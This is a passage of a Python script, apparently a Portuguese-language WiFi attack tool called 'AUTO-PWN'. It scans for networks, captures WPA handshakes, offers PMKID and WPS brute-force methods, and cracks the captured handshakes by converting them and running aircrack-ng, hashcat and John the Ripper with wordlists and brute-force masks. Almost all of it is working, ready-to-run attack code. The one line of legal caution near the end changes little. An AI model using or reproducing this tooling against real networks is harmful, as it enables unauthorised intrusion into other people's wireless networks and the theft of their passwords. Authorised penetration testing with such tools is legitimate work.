    print("\n[2/4] Tentando conversão com cap2hccapx...")
    if shell("which cap2hccapx").returncode == 0:
        hccapx_file2 = f"{base_name}_cap2.hccapx"
        result = shell(f"cap2hccapx '{cap}' '{hccapx_file2}' 2>&1")
        if os.path.exists(hccapx_file2) and os.path.getsize(hccapx_file2) > 0:
            print(f"[✅] cap2hccapx criou: {hccapx_file2}")
            hccapx_file = hccapx_file2
            success = True
    
    # Método 3: hcxtools para hc22000
    print("\n[3/4] Tentando conversão para hc22000 (hcxpcapngtool)...")
    hc22000_file = f"{base_name}.hc22000"
    if shell("which hcxpcapngtool").returncode == 0:
        result = shell(f"hcxpcapngtool -o '{hc22000_file}' '{cap}' 2>&1")
        if os.path.exists(hc22000_file) and os.path.getsize(hc22000_file) > 0:
            print(f"[✅] hc22000 criado: {hc22000_file}")
            success = True
    
    if not success:
        print("\n[❌] Todas as conversões falharam")
        print("[💡] Tente manualmente:")
        print(f"    aircrack-ng {cap} -J /tmp/teste")
        return False
    
    print("\n" + "="*80)
    print("[✅] ARQUIVOS CONVERTIDOS COM SUCESSO!")
    print("="*80)
    
    created_files = []
    for fmt, path in [("hccapx", hccapx_file), ("hc22000", hc22000_file)]:
        if os.path.exists(path) and os.path.getsize(path) > 0:
            created_files.append((fmt, path))
            print(f"[📁] {fmt.upper()}: {path}")
    
    if not created_files:
        return False
    
    print("\n[🔓] OPÇÕES DE CRACKING COM HASHCAT:")
    
    for i, (fmt, path) in enumerate(created_files, 1):
        print(f"\n[{i}] Formato: {fmt.upper()}")
        
        if fmt == "hccapx":
            print(f"    hashcat -m 2500 '{path}' wordlist.txt")
            print(f"    hashcat -m 2500 -a 3 '{path}' ?d?d?d?d?d?d?d?d")
        elif fmt == "hc22000":
            print(f"    hashcat -m 22000 '{path}' wordlist.txt")
            print(f"    hashcat -m 22000 -a 3 '{path}' ?d?d?d?d?d?d?d?d")
    
    print("\n[?] Deseja:")
    print("    1) Rodar hashcat agora")
    print("    2) Apenas mostrar comandos")
    print("    3) Voltar ao menu")
    
    choice = input("\nEscolha [1-3]: ").strip()
    
    if choice == "1":
        run_hashcat_now(created_files)
    elif choice == "2":
        return True
    
    return True

def run_hashcat_now(created_files):
    """Executa hashcat imediatamente"""
    print("\n[+] Iniciando hashcat...")
    
    if len(created_files) > 1:
        print("\n[?] Escolha o formato:")
        for i, (fmt, path) in enumerate(created_files, 1):
            print(f"    {i}) {fmt.upper()} - {os.path.basename(path)}")
        
        fmt_choice = input("\nEscolha: ").strip()
        try:
            fmt_idx = int(fmt_choice) - 1
            if 0 <= fmt_idx < len(created_files):
                fmt, hash_file = created_files[fmt_idx]
            else:
                fmt, hash_file = created_files[0]
        except:
            fmt, hash_file = created_files[0]
    else:
        fmt, hash_file = created_files[0]
    
    hashcat_mode = "2500" if fmt == "hccapx" else "22000"
    
    print("\n[?] Modo de ataque:")
    print("    1) Wordlist (recomendado)")
    print("    2) Brute force (números)")
    print("    3) Brute force (letras)")
    
    attack_mode = input("\nEscolha [1-3]: ").strip()
    
    if attack_mode == "1":
        wl = input("Caminho da wordlist [rockyou.txt]: ").strip()
        if not wl or not os.path.exists(wl):
            wl = "/usr/share/wordlists/rockyou.txt"
            if not os.path.exists(wl):
                print("[-] rockyou.txt não encontrada")
                wl = input("Digite o caminho completo: ").strip()
        
        if os.path.exists(wl):
            cmd = f"hashcat -m {hashcat_mode} -a 0 '{hash_file}' '{wl}'"
        else:
            print(f"[-] Wordlist não existe: {wl}")
            return
    
    elif attack_mode == "2":
        length = input("Comprimento [8]: ").strip()
        if not length:
            length = "8"
        mask = "?d" * int(length)
        cmd = f"hashcat -m {hashcat_mode} -a 3 '{hash_file}' {mask}"
    
    elif attack_mode == "3":
        length = input("Comprimento [8]: ").strip()
        if not length:
            length = "8"
        mask = "?l" * int(length)
        cmd = f"hashcat -m {hashcat_mode} -a 3 '{hash_file}' {mask}"
    
    else:
        print("[-] Opção inválida")
        return
    
    print(f"\n[▶️] Executando: {cmd}")
    print("[!] Pressione Ctrl+C para parar completamente")
    
    try:
        os.system(cmd)
    except KeyboardInterrupt:
        print("\n[⏹️] Hashcat interrompido pelo usuário")

def run_john(cap, essid, bssid):
    """Executa John the Ripper no handshake"""
    print("\n[+] Modo: John the Ripper (CPU)")
    print("[+] John pode usar múltiplas técnicas e wordlists")
    
    # Verifica se John está instalado
    if shell("which john").returncode != 0:
        print("[-] John the Ripper não instalado")
        print("[+] Instale: sudo apt install john")
        return False
    
    # Converte para formato John
    safe_essid = essid.replace(' ', '_').replace('/', '_')[:30]
    john_file = f"/tmp/john_{safe_essid}_{int(time.time())}"
    
    print("\n[+] Convertendo para formato John...")
    
    # Tenta converter com wpapcap2john
    if shell("which wpapcap2john").returncode == 0:
        result = shell(f"wpapcap2john '{cap}' > '{john_file}' 2>&1")
    elif shell("which cap2hccapx").returncode == 0:
        # Converte para hccapx primeiro
        hccapx_file = f"{john_file}.hccapx"
        result = shell(f"cap2hccapx '{cap}' '{hccapx_file}' 2>&1")
        if os.path.exists(hccapx_file):
            result = shell(f"hccap2john '{hccapx_file}' > '{john_file}' 2>&1")
    else:
        print("[-] Não foi possível converter para formato John")
        print("[+] Instale john com suporte a WiFi: sudo apt install john wpapcap2john")
        return False
    
    if not os.path.exists(john_file) or os.path.getsize(john_file) == 0:
        print("[-] Falha na conversão para formato John")
        return False
    
    print(f"[✅] Arquivo John criado: {john_file}")
    
    print("\n[?] Escolha o modo de ataque John:")
    print("    1) Wordlist (padrão)")
    print("    2) Wordlist com regras")
    print("    3) Incremental (força bruta)")
    print("    4) Modo único (combinatório)")
    
    john_mode = input("\nEscolha [1-4]: ").strip()
    
    # Escolhe wordlist
    wl = input("\nCaminho da wordlist [rockyou.txt]: ").strip()
    if not wl or not os.path.exists(wl):
        wl = "/usr/share/wordlists/rockyou.txt"
    
    if not os.path.exists(wl):
        print(f"[-] Wordlist não encontrada: {wl}")
        return False
    
    if john_mode == "1":
        cmd = f"john --wordlist='{wl}' '{john_file}'"
    elif john_mode == "2":
        cmd = f"john --wordlist='{wl}' --rules '{john_file}'"
    elif john_mode == "3":
        print("\n[?] Modo incremental:")
        print("    1) Dígitos (0-9)")
        print("    2) Letras minúsculas (a-z)")
        print("    3) Alfanumérico (a-z0-9)")
        
        inc_mode = input("Escolha [1-3]: ").strip()
        if inc_mode == "1":
            cmd = f"john --incremental:digits '{john_file}'"
        elif inc_mode == "2":
            cmd = f"john --incremental:alpha '{john_file}'"
        else:
            cmd = f"john --incremental:alnum '{john_file}'"
    elif john_mode == "4":
        cmd = f"john --single '{john_file}'"
    else:
        cmd = f"john --wordlist='{wl}' '{john_file}'"
    
    print(f"\n[▶️] Executando: {cmd}")
    print("[!] John pode demorar... Pressione Ctrl+C para parar")
    print("[💡] Para mostrar senhas encontradas: john --show '{john_file}'")
    
    try:
        os.system(cmd)
        
        # Mostra resultados se encontrou algo
        print("\n[+] Verificando senhas encontradas...")
        show_cmd = f"john --show '{john_file}'"
        os.system(show_cmd)
        
    except KeyboardInterrupt:
        print("\n[⏹️] John interrompido pelo usuário")
    
    return True

def offer_crack(cap, essid, bssid):
    """Oferece opções de cracking com fallback automático"""
    print("\n" + "="*80)
    print("[*] HANDHSHAKE CAPTURADO COM SUCESSO!")
    print("="*80)
    print(f"Arquivo: {cap}")
    print(f"Rede: {essid}")
    print(f"BSSID: {bssid}")
    
    while True:
        print("\n[OPÇÕES DE CRACKING]:")
        print("  1) aircrack-ng (wordlist local - CPU)")
        print("  2) hashcat (GPU acelerado)")
        print("  3) John the Ripper (CPU - múltiplos formatos)")
        print("  4) Salvar arquivos e voltar ao menu")
        print("  5) Tentar outra rede")
        print("="*80)
        
        opt = input("\nEscolha [1-5]: ").strip()
        
        if opt == "1":
            run_aircrack(cap, bssid)
            return ask_next_steps()
        
        elif opt == "2":
            if run_hashcat_conversion(cap, essid, bssid):
                return ask_next_steps()
            else:
                print("\n[!] Conversão para hashcat falhou")
                fallback = input("[?] Tentar com aircrack-ng? [S/n]: ").strip().lower()
                if fallback in ['', 's', 'sim', 'y', 'yes']:
                    run_aircrack(cap, bssid)
                return ask_next_steps()
        
        elif opt == "3":
            if run_john(cap, essid, bssid):
                return ask_next_steps()
            else:
                print("\n[!] John the Ripper falhou")
                fallback = input("[?] Tentar com aircrack-ng? [S/n]: ").strip().lower()
                if fallback in ['', 's', 'sim', 'y', 'yes']:
                    run_aircrack(cap, bssid)
                return ask_next_steps()
        
        elif opt == "4":
            save_and_exit(cap, essid, bssid)
            return True
        
        elif opt == "5":
            return True
        
        else:
            print("[-] Opção inválida")

def save_and_exit(cap, essid, bssid):
    """Salva arquivos e mostra comandos para uso posterior"""
    print("\n" + "="*80)
    print("[💾] SALVANDO ARQUIVOS PARA USO POSTERIOR")
    print("="*80)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_essid = essid.replace(' ', '_').replace('/', '_')[:30]
    
    save_dir = f"/tmp/wifi_crack_{safe_essid}_{timestamp}"
    os.makedirs(save_dir, exist_ok=True)
    
    cap_dest = f"{save_dir}/handshake.cap"
    shell(f"cp '{cap}' '{cap_dest}'")
    
    print(f"[📁] Arquivos salvos em: {save_dir}")
    print(f"[📄] Handshake: {cap_dest}")
    
    # Tenta conversões
    print("\n[⚙️] CONVERTENDO PARA OUTROS FORMATOS...")
    
    if shell("which cap2hccapx").returncode == 0:
        hccapx_file = f"{save_dir}/handshake.hccapx"
        shell(f"cap2hccapx '{cap_dest}' '{hccapx_file}' 2>/dev/null")
        if os.path.exists(hccapx_file):
            print(f"[✅] HCCAPX: {hccapx_file}")
    
    if shell("which hcxpcapngtool").returncode == 0:
        hc22000_file = f"{save_dir}/handshake.hc22000"
        shell(f"hcxpcapngtool -o '{hc22000_file}' '{cap_dest}' 2>/dev/null")
        if os.path.exists(hc22000_file):
            print(f"[✅] HC22000: {hc22000_file}")
    
    print(f"\n[🔧] COMANDOS PARA USAR DEPOIS:")
    print(f"\nAirCrack-NG:")
    print(f"    aircrack-ng -w wordlist.txt -b {bssid} '{cap_dest}'")
    
    print(f"\nHashCat:")
    print(f"    hashcat -m 2500 '{save_dir}/handshake.hccapx' wordlist.txt")
    print(f"    hashcat -m 22000 '{save_dir}/handshake.hc22000' wordlist.txt")
    
    print(f"\nJohn the Ripper:")
    print(f"    wpapcap2john '{cap_dest}' > '{save_dir}/handshake.john'")
    print(f"    john --wordlist=rockyou.txt '{save_dir}/handshake.john'")
    
    info_file = f"{save_dir}/network_info.txt"
    with open(info_file, 'w') as f:
        f.write(f"ESSID: {essid}\n")
        f.write(f"BSSID: {bssid}\n")
        f.write(f"Capture File: {cap_dest}\n")
        f.write(f"Capture Time: {timestamp}\n")
    
    print(f"\n[📝] Informações salvas em: {info_file}")

def ask_next_steps():
    """Pergunta o que fazer depois do cracking"""
    print("\n" + "="*80)
    print("[?] PRÓXIMOS PASSOS:")
    print("="*80)
    print("    1) Tentar mesma rede novamente (com outra wordlist/método)")
    print("    2) Escolher outra rede")
    print("    3) Sair do programa")
    
    while True:
        choice = input("\nEscolha [1-3]: ").strip()
        
        if choice == "1":
            return "retry_same"
        elif choice == "2":
            return "try_other"
        elif choice == "3":
            return "exit"
        else:
            print("[-] Opção inválida")

# ---------- main ----------
def main():
    print("\n" + "="*100)
    print("AUTO-PWN - WiFi Penetration Tool v2.0")
    print("="*100)
    print("[*] Modo inteligente: Detecta clientes e sugere melhor método")
    print("[*] 5 métodos de ataque incluindo PMKID (sem clientes necessários)")
    print("[*] 3 ferramentas de cracking: aircrack, hashcat e john")
    print("="*100)

    parser = argparse.ArgumentParser(description="WiFi pentest automation tool")
    parser.add_argument("-i", "--iface", help="Interface wireless (ex.: wlan1)")
    args = parser.parse_args()
    
    if os.geteuid() != 0:
        sys.exit("[-] Execute como root: sudo python3 auto-wifi.py")
    
    # Verifica dependências básicas
    print("[+] Verificando dependências...")
    basic_tools = ["airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
    for cmd in basic_tools:
        if shell(f"which {cmd}").returncode != 0:
            print(f"[-] {cmd} não encontrado. Instale com: sudo apt install aircrack-ng")
    
    iface = args.iface or choose_interface()

    kill_interfering()
    nm_unmanage(iface)
    start_mon(iface)
    
    while True:
        print("\n" + "="*100)
        print("[+] FASE 1: SCAN DE REDES")
        print("="*100)
        aps = scan(iface)
        
        if not aps:
            print("[-] Nenhuma rede encontrada")
            retry = input("[?] Tentar novamente? [s/N]: ").strip().lower()
            if retry != 's':
                break
            continue
        
        print(f"[+] {len(aps)} rede(s) encontrada(s)")
        
        while True:
            bssid, ch, enc, essid, client_count = choose_ap(aps)
            
            print(f"\n[+] FASE 2: ANÁLISE DA REDE")
            print("="*100)
            print(f"[*] Rede selecionada: {essid}")
            print(f"[*] BSSID: {bssid}")
            print(f"[*] Canal: {ch}")
            print(f"[*] Clientes detectados no scan: {client_count}")
            
            clients = check_clients_live(iface, bssid, ch)
            
            if not clients:
                print("\n[!] ⚠️  NENHUM CLIENTE CONECTADO NO MOMENTO")
                print("[+] Métodos tradicionais de handshake NÃO funcionarão")
                
                print("\n" + "="*100)
                print("[+] INICIANDO MODO BRUTE FORCE (SEM CLIENTES)")
                print("="*100)
                
                wps_tools = show_bruteforce_menu(iface, bssid, essid, ch, clients)
                
                while True:
                    choice = input("\nEscolha o método [1-5] ou 'v' para voltar: ").strip().lower()
                    
                    if choice == 'v':
                        break
                    elif choice in ['1', '2', '3', '4', '5']:
                        execute_bruteforce_method(choice, iface, bssid, essid, ch, wps_tools)
                        
                        another = input("\n[?] Tentar outro método nesta rede? [s/N]: ").strip().lower()
                        if another != 's':
                            break
                    else:
                        print("[-] Opção inválida")
                
                retry_other = input("\n[?] Escolher outra rede? [s/N]: ").strip().lower()
                if retry_other == 's':
                    break
                else:
                    continue
            
            print(f"\n[+] ✅ {len(clients)} CLIENTE(S) CONECTADO(S)")
            print("[+] Tentando capturar handshake tradicional...")
            
            cap = capture(iface, bssid, ch, essid)
            
            if cap and cap != "choose_other":
                result = offer_crack(cap, essid, bssid)
                
                if result == "retry_same":
                    continue
                elif result == "try_other":
                    break
                elif result == "exit":
                    return
                elif result is True:
                    break
            elif cap == "choose_other":
                break
            else:
                print("\n" + "="*100)
                print("[!] FALHA NA CAPTURA DO HANDSHAKE")
                print("[+] Oferecendo métodos alternativos...")
                
                wps_tools = show_bruteforce_menu(iface, bssid, essid, ch, clients)
                
                choice = input("\nEscolha o método [1-5] ou 'v' para voltar: ").strip().lower()
                
                if choice != 'v' and choice in ['1', '2', '3', '4', '5']:
                    execute_bruteforce_method(choice, iface, bssid, essid, ch, wps_tools)
            
            print("\n" + "="*100)
            print("[?] PRÓXIMOS PASSOS:")
            print("="*100)
            print("    1) Tentar mesma rede novamente")
            print("    2) Escolher outra rede")
            print("    3) Sair do programa")
            
            next_step = input("\nEscolha [1-3]: ").strip()
            
            if next_step == "1":
                continue
            elif next_step == "2":
                break
            elif next_step == "3":
                return
            else:
                break
        
        continue_scan = input("\n[?] Fazer novo scan? [s/N]: ").strip().lower()
        if continue_scan != 's':
            break
    
    print("\n" + "="*100)
    print("[+] OPERAÇÃO CONCLUÍDA")
    print("="*100)
    print("📋 RESUMO DOS MÉTODOS DISPONÍVEIS:")
    print("    • PMKID: Melhor método atual, não precisa de clientes")
    print("    • WPS: Só funciona em routers antigos (pré-2018)")
    print("    • Handshake tradicional: Precisa de clientes ativos")
    print("    • Cracking: aircrack (CPU), hashcat (GPU), john (CPU)")
    print("\n⚖️  LEMBRETE LEGAL:")
    print("    • Use apenas em redes próprias ou autorizadas")
    print("    • Conheça as leis locais sobre segurança WiFi")
    print("="*100)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrompido pelo usuário")
    except Exception as e:
        print(f"\n[-] Erro: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n[+] Limpando...")
        try:
            if 'iface' in locals() and iface:
                shell(f"nmcli device set {iface} managed yes 2>/dev/null")
        except:
            pass
